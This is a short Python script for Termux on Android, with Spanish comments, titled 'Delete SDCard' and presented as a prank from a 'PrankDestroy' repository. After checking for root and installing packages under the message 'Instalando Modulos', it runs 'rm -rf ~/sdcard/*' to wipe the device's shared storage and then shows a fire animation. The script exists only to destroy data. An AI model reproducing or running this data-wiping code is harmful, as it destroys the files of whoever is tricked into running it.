
# Delete SDCard
# By: https://github.com/Br3Fuck/PrankDestroy
# Modulos:

import os, sys, time
from colorama import *

# Clear:

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Run Root:

if os.geteuid() != 0:
    clear()
    print("Inicia el archivo como root...")
    sys.exit(0)
else:
    pass

# Delete SDCard Commands:

def delcard():
    clear()
    os.system("termux-setup-storage")
    os.system("pkg install -y tsu >> registros.txt")
    os.system("pkg install -y libcaca >> registro.txt")
    print("Instalando Modulos...")
    print("Eliminando SD Card...")
    os.system("rm -rf ~/sdcard/*")
    os.system("cacafire")

delcard()
